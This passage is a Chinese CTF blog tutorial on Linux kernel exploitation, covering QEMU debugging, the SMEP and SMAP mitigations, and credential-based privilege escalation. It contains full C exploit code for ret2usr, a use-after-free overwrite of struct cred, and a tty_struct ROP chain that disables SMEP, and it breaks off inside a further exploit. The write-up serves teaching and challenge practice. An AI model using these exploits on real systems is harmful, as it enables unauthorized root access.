<!doctype html><html lang=zh-cn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Kernel Pwn: 从入门到入土 | hhdx's blog</title>
<meta name=keywords content="Kernel Pwn,CTF"><meta name=description content="MISC
内核文件区别
vmlinux 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。
vmlinuz 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息


1
2


Decompressing Linux... done
Booting the kernel.


zImage 是经过压缩的小内核（小于512KB）。
bzImage 是经过压缩的大内核（大于512KB）。
Initial Ramdisk
名字类似initramfs.cpio 文件，一般可以使用cpio读取其中的文件。


1
2


$ find . | cpio -o --format=newc > initramfs.cpio # compress
$ sudo cpio -idmv < initramfs.cpio # depress


有时也经过了gzip的压缩。


1
2
3


$ mv initramfs.cpio initramfs.cpio.gz
$ gunzip initramfs.cpio.gz	# 解压得到initramfs.cpio
$ cpio -idmv < initramfs.cpio


更改为正确的后缀之后，图形界面“归档管理器”也可以打开。"><meta name=author content="hhdx"><link rel=canonical href=https://hhdx.xyz/post/kernel-pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://hhdx.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hhdx.xyz/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hhdx.xyz/favicon-32x32.png><link rel=apple-touch-icon href=https://hhdx.xyz/apple-touch-icon.png><link rel=mask-icon href=https://hhdx.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=https://hhdx.xyz/post/kernel-pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hhdx.xyz/post/kernel-pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/"><meta property="og:site_name" content="hhdx's blog"><meta property="og:title" content="Kernel Pwn: 从入门到入土"><meta property="og:description" content="MISC 内核文件区别 vmlinux 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。
vmlinuz 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息
1 2 Decompressing Linux... done Booting the kernel. zImage 是经过压缩的小内核（小于512KB）。
bzImage 是经过压缩的大内核（大于512KB）。
Initial Ramdisk 名字类似initramfs.cpio 文件，一般可以使用cpio读取其中的文件。
1 2 $ find . | cpio -o --format=newc > initramfs.cpio # compress $ sudo cpio -idmv < initramfs.cpio # depress 有时也经过了gzip的压缩。
1 2 3 $ mv initramfs.cpio initramfs.cpio.gz $ gunzip initramfs.cpio.gz	# 解压得到initramfs.cpio $ cpio -idmv < initramfs.cpio 更改为正确的后缀之后，图形界面“归档管理器”也可以打开。"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-10-25T19:12:40+00:00"><meta property="article:modified_time" content="2020-10-25T19:12:40+00:00"><meta property="article:tag" content="Kernel Pwn"><meta property="article:tag" content="CTF"><meta name=twitter:card content="summary"><meta name=twitter:title content="Kernel Pwn: 从入门到入土"><meta name=twitter:description content="MISC
内核文件区别
vmlinux 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。
vmlinuz 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息


1
2


Decompressing Linux... done
Booting the kernel.


zImage 是经过压缩的小内核（小于512KB）。
bzImage 是经过压缩的大内核（大于512KB）。
Initial Ramdisk
名字类似initramfs.cpio 文件，一般可以使用cpio读取其中的文件。


1
2


$ find . | cpio -o --format=newc > initramfs.cpio # compress
$ sudo cpio -idmv < initramfs.cpio # depress


有时也经过了gzip的压缩。


1
2
3


$ mv initramfs.cpio initramfs.cpio.gz
$ gunzip initramfs.cpio.gz	# 解压得到initramfs.cpio
$ cpio -idmv < initramfs.cpio


更改为正确的后缀之后，图形界面“归档管理器”也可以打开。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hhdx.xyz/post/"},{"@type":"ListItem","position":2,"name":"Kernel Pwn: 从入门到入土","item":"https://hhdx.xyz/post/kernel-pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Kernel Pwn: 从入门到入土","name":"Kernel Pwn: 从入门到入土","description":"MISC 内核文件区别 vmlinux 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。\nvmlinuz 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息\n1 2 Decompressing Linux... done Booting the kernel. zImage 是经过压缩的小内核（小于512KB）。\nbzImage 是经过压缩的大内核（大于512KB）。\nInitial Ramdisk 名字类似initramfs.cpio 文件，一般可以使用cpio读取其中的文件。\n1 2 $ find . | cpio -o --format=newc \u0026gt; initramfs.cpio # compress $ sudo cpio -idmv \u0026lt; initramfs.cpio # depress 有时也经过了gzip的压缩。\n1 2 3 $ mv initramfs.cpio initramfs.cpio.gz $ gunzip initramfs.cpio.gz\t# 解压得到initramfs.cpio $ cpio -idmv \u0026lt; initramfs.cpio 更改为正确的后缀之后，图形界面“归档管理器”也可以打开。\n","keywords":["Kernel Pwn","CTF"],"articleBody":"MISC 内核文件区别 vmlinux 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。\nvmlinuz 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息\n1 2 Decompressing Linux... done Booting the kernel. zImage 是经过压缩的小内核（小于512KB）。\nbzImage 是经过压缩的大内核（大于512KB）。\nInitial Ramdisk 名字类似initramfs.cpio 文件，一般可以使用cpio读取其中的文件。\n1 2 $ find . | cpio -o --format=newc \u003e initramfs.cpio # compress $ sudo cpio -idmv \u003c initramfs.cpio # depress 有时也经过了gzip的压缩。\n1 2 3 $ mv initramfs.cpio initramfs.cpio.gz $ gunzip initramfs.cpio.gz\t# 解压得到initramfs.cpio $ cpio -idmv \u003c initramfs.cpio 更改为正确的后缀之后，图形界面“归档管理器”也可以打开。\nCompile kernel Host: Ubuntu 20.04\n1 2 3 4 5 6 7 8 $ wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.72.tar.xz # get link from kernel.org $ xz -d -v linux-5.4.72.tar.xz $ tar xvf linux-5.4.72.tar $ cd linux-5.4.72 $ cp -v /boot/config-$(uname -r) .config $ sudo apt-get install build-essential libncurses-dev bison flex libssl-dev libelf-dev $ make menuconfig # optional, 此项设置好之后除非必要，尽量不要改动，否则会完全的重新编译 $ make # make -j $(nproc) Qemu 1 2 3 4 5 6 7 8 9 10 11 12 13 14 -m 指定内存大小 -nographic 没有图形界面，同时影响串并口 -kernel 指定启动内核 -machine 选择模拟的机器 -machine help显示所有 -accel 选择加速，有kvm、xen等等 -append 添加内核启动选项 -monitor 重定向monitor到主机设备，图形模式默认到vc，非图形模式默认到stdio -fsdev 定义一个新的文件系统设备 与-device virtio-9t-同用 -device virtio-9p-type,fsdev=id,mount_tag=mount_tag -enable-kvm 启用kvm全虚拟化支持 -initrd 将文件用作起始ram disk -hda/b/c/d 将文件用作硬盘0/1/2/3 -snapshot 写入临时文件，而不是映像文件。（可以强制写回 Debug 使用qemu的-s选项，默认将会在1234端口开启gdb server。如果 1234 号端口用不了，也可以换成 -gdb tcp::[port num]\n加断点的话，CTRL+C打断 gdb，输入就行。\n1 2 3 4 $ lsmod # 查看加载的模块 $ cat /sys/module/basic1_ch1/sections/.text # 依次获取.text .bss .data加载地址 (gdb)$ target remote :1234 # 连接到本地调试端口 (gdb)$ add-symbol-file ./tostring.ko 0xc3827000 -s .bss 0xc3827600 -s .data 0xc3827360 # 在gdb中加载符号 Mitigation SMEP 全称Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)。\n系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。\nCR4 寄存器是可以通过 mov 指令修改的。从vmlinux中提取gadget，可以达到这个目的。\ngdb无法查看CR4寄存器的值，可以通过kernel crash时的信息来查看。关闭SMEP保护，常用一个固定的值0x6f0,即mov cr4, 0x6f0。\nSMAP Superivisor Mode Access Protection，类似于 SMEP，当处理器处于 ring 0 模式，访问用户空间的数据会触发页错误。\nMMAP_MIN_ADDR MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。 upload脚本 用于将poc或exp上传到主机。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #!/usr/bin/env python3 from pwn import * import os prompt = \"$ \" def upload(name): io.sendlineafter(prompt, \"stty -echo\") # 关闭回显 os.system(\"gcc -static -m32 -O2 ./{}.c -o {}\".format(name, name)) # 普通gcc编译。musl-gcc编译32bit出错 os.system(\"gzip -c {} \u003e {}.gz\".format(name, name)) with open(\"{}.gz\".format(name), \"rb\") as f: content = f.read() print(\"len: %d\" % len(content)) encoded = base64.b64encode(content) print(\"len: %d\" % len(encoded)) for i in range(0, len(encoded), 1000): # 文件过大会出现上传不完整，后来改成1000就可以 io.sendline(\"echo \\\"{}\\\" \u003e\u003e {}.gz.b64\".format(encoded[i:i+1000].decode(\"ascii\"), name) ) io.sendlineafter(prompt, \"base64 -d {}.gz.b64 \u003e {}.gz\".format(name, name)) io.sendlineafter(prompt, \"gunzip {}.gz\".format(name)) io.sendlineafter(prompt, \"chmod +x {}\".format(name)) io.sendlineafter(prompt, \"./{}\".format(name)) io.interactive() io = process(\"./._start_vm\", shell=True) upload(\"poc\") # session = ssh(USER, HOST, PORT, PW) # ssh连接的情况 # io = session.run(\"/bin/sh\") 预备知识 Loadable Kernel Modules(LKMs)[3] 可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:\nLKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。\n模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。\n模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。\nLinux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。\n相关指令 insmod: 将指定模块加载到内核中。 rmmod: 从内核中卸载指定模块。 lsmod: 列出已经加载的模块。 modprobe: 添加或删除模块，modprobe 在加载模块时会查找依赖关系。 file_operations结构体 用户进程在对设备文件进行诸如read/write操作的时候，系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。\n内核模块程序的结构中包括一些call back回调表，对应的函数存储在一个file_operations(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。例如：\nEvents User functions Kernel functions load insmod module_init() open fopen file_operations: open read fread file_operations: read write fwrite file_operations: write close fclose file_operations: release remove rmmod module_exit() 状态切换[3] user space to kernel space 当发生 系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体的过程为：\n通过 swapgs 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。 将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。 通过 push 保存各寄存器值，具体的 代码 如下: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ENTRY(entry_SYSCALL_64) /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */ SWAPGS_UNSAFE_STACK /* 保存栈值，并设置内核栈 */ movq %rsp, PER_CPU_VAR(rsp_scratch) movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp /* 通过push保存寄存器值，形成一个pt_regs结构 */ /* Construct struct pt_regs on stack */ pushq $__USER_DS /* pt_regs-\u003ess */ pushq PER_CPU_VAR(rsp_scratch) /* pt_regs-\u003esp */ pushq %r11 /* pt_regs-\u003eflags */ pushq $__USER_CS /* pt_regs-\u003ecs */ pushq %rcx /* pt_regs-\u003eip */ pushq %rax /* pt_regs-\u003eorig_ax */ pushq %rdi /* pt_regs-\u003edi */ pushq %rsi /* pt_regs-\u003esi */ pushq %rdx /* pt_regs-\u003edx */ pushq %rcx tuichu /* pt_regs-\u003ecx */ pushq $-ENOSYS /* pt_regs-\u003eax */ pushq %r8 /* pt_regs-\u003er8 */ pushq %r9 /* pt_regs-\u003er9 */ pushq %r10 /* pt_regs-\u003er10 */ pushq %r11 /* pt_regs-\u003er11 */ sub $(6*8), %rsp /* pt_regs-\u003ebp, bx, r12-15 not saved */ 通过汇编指令判断是否为 x32_abi。\n通过系统调用号，跳到全局变量 sys_call_table 相应位置继续执行系统调用。\nkernel space to user space 通过 swapgs 恢复 GS 值 通过 sysretq 或者 iretq 恢复到用户控件继续执行。如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等） iretq中q后缀，是quadra word的意思，也就是说64位指令。还存在iretd, iretw等。\n内核态函数[3] 相比用户态库函数，内核态的函数有了一些变化\nprintf() -\u003e printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 dmesg 查看效果 memcpy() -\u003e copy_from_user()/copy_to_user() copy_from_user() 实现了将用户空间的数据传送到内核空间 copy_to_user() 实现了将内核空间的数据传送到用户空间 malloc() -\u003e kmalloc()，内核态的内存分配函数，和 malloc() 相似，但使用的是 slab/slub 分配器 free() -\u003e kfree()，同 kmalloc() 提权函数\nkernel 管理进程，因此 kernel 也记录了进程的权限。kernel 中有两个可以方便的改变权限的函数：\nint commit_creds(struct cred *new) struct cred* prepare_kernel_cred(struct task_struct* daemon) 从函数名也可以看出，执行 commit_creds(prepare_kernel_cred(0)) 即可获得 root 权限（root 的 uid，gid 均为 0）\n执行 commit_creds(prepare_kernel_cred(0)) 也是最常用的提权手段，两个函数的地址都可以在 /proc/kallsyms 中查看（较老的内核版本中是 /proc/ksyms。通常需要root权限查看。\n1 $ sudo grep commit_creds /proc/kallsyms struct cred 每个进程都有这么个结构，如果能修改，也就获得了对应权限。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 struct cred { atomic_t\tusage; #ifdef CONFIG_DEBUG_CREDENTIALS atomic_t\tsubscribers;\t/* number of processes subscribed */ void\t*put_addr; unsigned\tmagic; #define CRED_MAGIC\t0x43736564 #define CRED_MAGIC_DEAD\t0x44656144 #endif kuid_t\tuid;\t/* real UID of the task */ kgid_t\tgid;\t/* real GID of the task */ kuid_t\tsuid;\t/* saved UID of the task */ kgid_t\tsgid;\t/* saved GID of the task */ kuid_t\teuid;\t/* effective UID of the task */ kgid_t\tegid;\t/* effective GID of the task */ kuid_t\tfsuid;\t/* UID for VFS ops */ kgid_t\tfsgid;\t/* GID for VFS ops */ unsigned\tsecurebits;\t/* SUID-less security management */ kernel_cap_t\tcap_inheritable; /* caps our children can inherit */ kernel_cap_t\tcap_permitted;\t/* caps we're permitted */ kernel_cap_t\tcap_effective;\t/* caps we can actually use */ kernel_cap_t\tcap_bset;\t/* capability bounding set */ kernel_cap_t\tcap_ambient;\t/* Ambient capability set */ #ifdef CONFIG_KEYS unsigned char\tjit_keyring;\t/* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key\t*process_keyring; /* keyring private to this process */ struct key\t*thread_keyring; /* keyring private to this thread */ struct key\t*request_key_auth; /* assumed request_key authority */ #endif #ifdef CONFIG_SECURITY void\t*security;\t/* subjective LSM security */ #endif struct user_struct *user;\t/* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info;\t/* supplementary groups for euid/fsgid */ struct rcu_head\trcu;\t/* RCU deletion hook */ } __randomize_layout; 题目 ret2usr | Rootme buffer overflow basic 1 题目有以下几个文件：\nbzImage：内核文件 ch1.c：模块源代码 initramfs.img：用cpio打包成的初始文件系统 passwd.img：flag所在，在qemu中普通用户无法读取 run：set-uid程序，运行._start_vm启动qemu ._start_vm：启动脚本 虚拟机中/init文件，在Linux启动的最后一步将会执行此脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #!/bin/sh # 挂载 devtmpfs 类型的文件系统，设备名设置为 none，挂载目录为 /dev # devtmpfs 的功用是在 Linux 核心启动早期建立一个初步的 /dev， # 令一般启动程序不用等待 udev，缩短 GNU/Linux 的开机时间。[4] mount -t devtmpfs none /dev mount -t proc proc /proc mount -t sysfs sysfs /sys # # flag # mkdir -p /passwd mount -t ext2 -o ro /dev/sda /passwd # # share # # 挂载与主机共享的文件夹 mkdir -p /mnt/share mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync chmod 777 /mnt/share/ # # module # # 安装漏洞模块 insmod /lib/modules/*/rootme/*.ko chmod 666 /dev/tostring # mmap_min_addr to 0 for the challenge to be simpler for now ;) echo 0 \u003e /proc/sys/vm/mmap_min_addr # # shell # cat /etc/issue export ENV=/etc/profile setsid cttyhack setuidgid 1000 sh umount /proc umount /sys umount /dev poweroff -f 在tostring模块中可以发现，tostring结构中tostring_stack存在溢出的可能，在tostring_write中并未作出限制。tostring_stack后面就是一个函数指针。同时该kernel并没有随机化，通过/proc/kallsyms获取prepare_kernel_cred和commit_creds函数的地址。\n调试中可以用条件断点b tostring_write if (int)tostring==64比较方便。\nexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 #include #include #include #include #include #include #include struct trap_frame { void *eip; uint32_t cs; uint32_t eflags; void *esp; uint32_t ss; }__attribute__((packed)); struct trap_frame tf; void getshell(void) { execl(\"/bin/sh\", \"sh\", NULL); } void init_tf_work(void) { asm( \"pushl %cs;popl tf+4;\" \"pushfl;popl tf+8;\" \"pushl %esp;popl tf+12;\" \"pushl %ss;popl tf+16;\" ); tf.eip = \u0026getshell; tf.esp -= 1024; } #define KERNCALL __attribute__((regparm(3))) void* (*prepare_kernel_cred)(void *) KERNCALL = (void *)0xc10711f0; void* (*commit_creds)(void *) KERNCALL = (void *)0xc1070e80; void payload(void) { commit_creds(prepare_kernel_cred(0)); asm( \"mov $tf, %esp;\" \"iret;\" ); } int main(void) { char recv[255]; char padding[9] = \"AAAAAAAA\"; char eip[5]; init_tf_work(); int fd = open(\"/dev/tostring\", O_RDWR); for (int i = 0; i \u003c 0x40; ++i) { write(fd, padding, sizeof(padding)-1); } *((void**)(eip)) = \u0026payload; write(fd, eip, sizeof(eip)-1); read(fd, recv, 255); return 0; } UAF \u0026 ROP | CISCN2017 babydriver ioctl 1 int ioctl(int fd, unsigned long request, ...); 第一个参数是文件描述符，第二个是程序对设备的控制指令，后面则是指令的补充参数。\n对于Linux，一切皆文件。而Linux提供的读写文件的函数（read, write, lseek等）对于许多的设备不好进行控制，所以提供了ioctl函数。request就是设备驱动程序提供的控制指令。\n分析 babydriver_init，babydriver_exit是常规的创建和销毁过程。\nbabyioctl定义了一个ioctl指令来分配指定大小的buf。\nbabyopen默认分配一个64字节的buf。kmem_cache_alloc_trace似乎是kmalloc优化的结果，还不了解后续再研究。src\nbabyread/babywrite 从buf读取数据/往buf写入数据，都对大小进行了验证，不存在溢出。\n漏洞点在于该符号设备全局共享一个buf，所以同时打开两次，这两次共享一个buf，释放其中一个就发生了UAF。\nexploit1 打开两次设备，使用ioctl控制buf为struct cred的大小，然后close其中一次打开，另一次打开就指向了一块已经释放的区域，fork产生的新进程就会分配得到该区块用来存储cred，通过另一次打开的设备进行覆写改变进程uid、gid，就获得了root权限。\n在这里计算struct cred的大小是一个难点，我并未找到很简单的方法来计算。因为这个结构体里面也有许多的结构体，我觉得直接看源码并不那么容易计算。。。一层套一层，还有对齐的问题。先直接用了，后面再找办法[todolist2]\u003c已解决\u003e，大小为0xa8。src\nexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include #include #include int main() { int fd1 = open(\"/dev/babydev\", O_RDWR); int fd2 = open(\"/dev/babydev\", O_RDWR); pid_t pid; ioctl(fd1, 0x10001, 0xa8); close(fd1); if ((pid = fork()) == 0) { char zero[36] = {0}; write(fd2, zero, sizeof(zero)); if (getuid() == 0) { system(\"/bin/sh\"); exit(0); } } else if (pid \u003e 0) { wait(NULL); } else { printf(\"Fork failed!\\n\"); } close(fd2); return 0; } exploit2 思路：利用gadgets关闭SMEP，内核没有开启地址随机，直接commit_creds(prepare_kernel_cred(0))，然后跳转到用户程序getshell。\n这里使用覆写tty_struct的方法来获得程序控制流：\ntty_struct\nstruct tty_struct ```c struct tty_struct { int magic; struct kref kref; struct device *dev; struct tty_driver *driver; const struct tty_operations *ops; \u003c -- 这里 int index; /* Protects ldisc changes: Lock tty not pty */ struct ld_semaphore ldisc_sem; struct tty_ldisc *ldisc; struct mutex atomic_write_lock; struct mutex legacy_mutex; struct mutex throttle_mutex; struct rw_semaphore termios_rwsem; struct mutex winsize_mutex; spinlock_t ctrl_lock; spinlock_t flow_lock; /* Termios values are protected by the termios rwsem */ struct ktermios termios, termios_locked; struct termiox *termiox; /* May be NULL for unsupported */ char name[64]; struct pid *pgrp; /* Protected by ctrl lock */ struct pid *session; unsigned long flags; int count; struct winsize winsize; /* winsize_mutex */ unsigned long stopped:1, /* flow_lock */ flow_stopped:1, unused:BITS_PER_LONG - 2; int hw_stopped; unsigned long ctrl_status:8, /* ctrl_lock */ packet:1, unused_ctrl:BITS_PER_LONG - 9; unsigned int receive_room; /* Bytes free for queue */ int flow_change; struct tty_struct *link; struct fasync_struct *fasync; wait_queue_head_t write_wait; wait_queue_head_t read_wait; struct work_struct hangup_work; void *disc_data; void *driver_data; spinlock_t files_lock; /* protects tty_files list */ struct list_head tty_files; #define N_TTY_BUF_SIZE 4096 int closing; unsigned char *write_buf; int write_cnt; /* If the tty has a pending do_SAK, queue it here - akpm */ struct work_struct SAK_work; struct tty_port *port; } __randomize_layout; ``` struct tty_operations\nstruct tty_operations ```c struct tty_operations { struct tty_struct * (*lookup)(struct tty_driver *driver, struct file *filp, int idx); int (*install)(struct tty_driver *driver, struct tty_struct *tty); void (*remove)(struct tty_driver *driver, struct tty_struct *tty); int (*open)(struct tty_struct * tty, struct file * filp); void (*close)(struct tty_struct * tty, struct file * filp); void (*shutdown)(struct tty_struct *tty); void (*cleanup)(struct tty_struct *tty); int (*write)(struct tty_struct * tty, const unsigned char *buf, int count); int (*put_char)(struct tty_struct *tty, unsigned char ch); void (*flush_chars)(struct tty_struct *tty); int (*write_room)(struct tty_struct *tty); int (*chars_in_buffer)(struct tty_struct *tty); int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); long (*compat_ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); void (*set_termios)(struct tty_struct *tty, struct ktermios * old); void (*throttle)(struct tty_struct * tty); void (*unthrottle)(struct tty_struct * tty); void (*stop)(struct tty_struct *tty); void (*start)(struct tty_struct *tty); void (*hangup)(struct tty_struct *tty); int (*break_ctl)(struct tty_struct *tty, int state); void (*flush_buffer)(struct tty_struct *tty); void (*set_ldisc)(struct tty_struct *tty); void (*wait_until_sent)(struct tty_struct *tty, int timeout); void (*send_xchar)(struct tty_struct *tty, char ch); int (*tiocmget)(struct tty_struct *tty); int (*tiocmset)(struct tty_struct *tty, unsigned int set, unsigned int clear); int (*resize)(struct tty_struct *tty, struct winsize *ws); int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew); int (*get_icount)(struct tty_struct *tty, struct serial_icounter_struct *icount); void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m); #ifdef CONFIG_CONSOLE_POLL int (*poll_init)(struct tty_driver *driver, int line, char *options); int (*poll_get_char)(struct tty_driver *driver, int line); void (*poll_put_char)(struct tty_driver *driver, int line, char ch); #endif int (*proc_show)(struct seq_file *, void *); } __randomize_layout; ``` 可以看到tty_struct结构偏移24的地方存放了一个tty_operations结构的指针，这个tty_operations结构都是对tty进行操作的函数指针，可以控制ops指针指向我们可以控制的区域。显然一次函数调用，我们能干的事情很少，所以就使用这一次调用执行stack pivot，ROP来获得持续的控制。\n这里使用write函数调用，在执行到write时，可以发现此时rax指向tty_operations的首地址，所以先在operations中构造rop。（在V1NKe师傅的文章中可以发现write是通过call [rax+0x38]调用的。如果一开始，应该怎样找到这个断点地址？[todolist1] \u003c已解决\u003e）\n使用extract-vmlinux脚本解压得到内核镜像，再通过ROPgadget或者Ropper获得gadgets。\n1 2 3 $ ./extract-vmlinux bzImage \u003e vmlinux $ ROPgadget --binary vmlinux \u003e gadgets $ ROPgadget --binary vmlinux --opcode 48cf # search for iretq 利用流程：\n1 2 3 4 5 6 1. 两次打开/dev/babydev设备，ioctl该设备buf为0x2e0 # sizeof(struct tty_struct) = 0x2e0 2. 在tty_operations上布置rop 3. 关闭一个babydev，会将buf释放一次，造成UAF 4. open(\"/dev/ptmx\", O_RDWR|O_NOCTTY)将使用刚释放的0x2e0空间存储tty_struct 5. 改写tty_struct 6. write触发 exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 #include #include #include #include #include struct trap_frame { uint64_t rip; uint64_t cs; uint64_t rflags; uint64_t rsp; uint64_t ss; }; struct trap_frame tf; #define KERNCALL __attribute__((regparm(3))) void* (*prepare_kernel_cred)(void *) KERNCALL = (void *)0xffffffff810a1810; int (*commit_creds)(void *) KERNCALL = (void *)0xffffffff810a1420; void save_status() { asm( \"mov %cs, tf+8;\" \"pushfq; popq tf+16;\" \"mov %rsp, tf+24;\" \"mov %ss, tf+32;\" ); puts(\"Status saved!\"); } void get_shell() { system(\"/bin/sh\"); } int get_root() // 如果不加返回值，这个函数会被编译成不返回 { commit_creds(prepare_kernel_cred(0)); return 0; } int main() { save_status(); uint64_t fake_tty_operations[30]; uint64_t fake_tty[4] = {0}; uint64_t rop[30] = { 0xffffffff810d238d, // pop rdi ; ret 关闭SMEP 0x6f0, 0xffffffff81004d80, // mov cr4, rdi ; pop rbp ; ret 0, get_root, 0xffffffff81063694, // swapgs ; pop rbp ; ret 0, 0xffffffff814ee0a4, // opcode: 48 cf iretq }; tf.rip = get_shell; *(struct trap_frame*)(\u0026rop[8]) = tf; for (int i = 0; i \u003c 30; ++i) { fake_tty_operations[i] = 0xFFFFFFFF8181BFC5; // 0xFFFFFFFF8181BFC5 : rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e // 0xffffffff8181bf7e: ret // 这个gadget，ROPgadget搜索结果错误，详见ERROR节 } fake_tty_operations[0] = 0xffffffff8100ce6e; // pop rax; ret fake_tty_operations[1] = rop; fake_tty_operations[2] = 0xFFFFFFFF8181BFC5; // 0xFFFFFFFF8181BFC5 : rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e // 0xffffffff8181bf7e: ret int fd1 = open(\"/dev/babydev\", O_RDWR); int fd2 = open(\"/dev/babydev\", O_RDWR); ioctl(fd1, 0x10001, 0x2e0); close(fd1); int fd_tty = open(\"/dev/ptmx\", O_RDWR | O_NOCTTY); read(fd2, fake_tty, 32); fake_tty[3] = fake_tty_operations; write(fd2, fake_tty, 32); char buf[8] = {0}; write(fd_tty, buf, 8); return 0; } exploit3 exp3和exp2很像，差别在于使用了ioctl触发的tty_operations。与write不同，调用ioctl是用的call rax，所以rax中所存储的就是ioctl函数的地址。\nexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 